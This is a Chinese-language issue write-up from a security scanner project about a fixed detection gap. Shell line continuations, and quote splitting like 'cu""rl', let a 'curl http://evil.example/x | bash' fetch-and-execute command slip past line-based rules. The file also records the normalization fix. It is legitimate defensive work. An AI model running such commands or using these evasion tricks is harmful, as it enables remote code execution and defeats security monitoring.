<!-- SPDX-License-Identifier: MIT -->
# 001 — shell 续行符切断规则匹配

- **类别**：检测绕过
- **严重程度**：高（可绕过 EXEC-001 等核心规则，直达任意执行）
- **状态**：**已修复**（`internal/detect/logical.go`，与 `feat/escalation-plan` 合并后的实现）

## 问题描述

静态规则按**行**匹配。shell 续行符（行尾 `\`）把一条命令拆到两行后，
`curl … | bash` 这类模式的两半落在不同的行上，正则永远匹配不到完整模式：

```sh
curl http://evil.example/x \
  | bash
```

语义上与单行 `curl http://evil.example/x | bash` 完全等价，但 EXEC-001 不再命中。

## 出处

- 对抗语料反向断言：[cmd/aguard/adversarial_test.go:231](../cmd/aguard/adversarial_test.go)
  （`knownGap: "rules match one line at a time; a shell line continuation puts the two halves on different lines"`）
- ROADMAP "Known limitations" 明确列出。
- 逐行匹配实现：[internal/detect/detect.go](../internal/detect/detect.go)

## 影响

攻击者只需在 payload 里加一个 `\` 换行即可绕过所有跨 token 的执行/外传规则。
成本极低、无兼容性代价，是已确认绕过里最容易被实际利用的一个。

## 修复方向

1. **预处理折行**：扫描 shell 类文本前把 `\` + 换行折叠为单行（保留原行号映射，
   保证 finding 的 `file:line` 仍指向源文件真实位置）。折叠只用于匹配，不改动原文。
2. 或并入 A.1 AST 检测：shell 语法树天然不受续行影响（见 [007](007-regex-precision-awaiting-ast.md)）。
3. 修复后必须同步翻转对抗语料中的反向断言（`wantMissed` → `wantCaught`）。

## 关联

- [002](002-unicode-evasion.md)（同为"正则字面量匹配"这一根因的另一面）
- [007](007-regex-precision-awaiting-ast.md)（AST 是两者的共同根治方案）

## 修复记录

在规则看到文本之前做一次词法归一化（`internal/detect/logical.go`），把行尾续行折叠成一行，
并返回一张行号映射表，使 finding 仍然指向命令**起始**的那一行——折叠会缩短文件，直接用
归一化后的索引会让每个折叠点之后的证据行号整体漂移。

反斜杠的**转义**要算奇偶：行尾偶数个反斜杠是字面量而非续行。反了会把无关的两行粘起来、
凭空造出一个从没写过的构造——那是用一个消除漏报的动作制造出误报。

切点选在**构造逻辑行**这一层（`logicalLines()`）而不是各个消费方：多处循环按行索引同一份文本，
按消费方各修一遍等于建多套归一化和多张行号表并指望它们不漂移。

合并 `feat/escalation-plan` 后采用了那一侧的实现，它多做了两件我这边没有的事：**引号折叠**
（`cu""rl` 对 shell 就是 `curl`，第三种同类绕过），以及 **raw/norm 双视图** —— 规则先在原文上跑、
只对没命中的再跑归一化文本，所以归一化**只能增加 finding、永不移除**；而证据引用的是**文件里
真实的样子**，不是折叠后的形态。后一点我原来做反了：操作者在报告里读到 `curl x`、在文件里看到
`cu""rl x`，等于被告知了关于自己机器的错误信息。

与 [002](002-unicode-evasion.md) 合并落地（同一个 pass）。对抗语料的反向断言已翻转为
正向断言 `wantCaught: []string{"EXEC-001"}`——这是整份语料里最便宜的绕过（一个反斜杠），
一旦有新的 unit 来源绕过归一化，它会第一个回归。
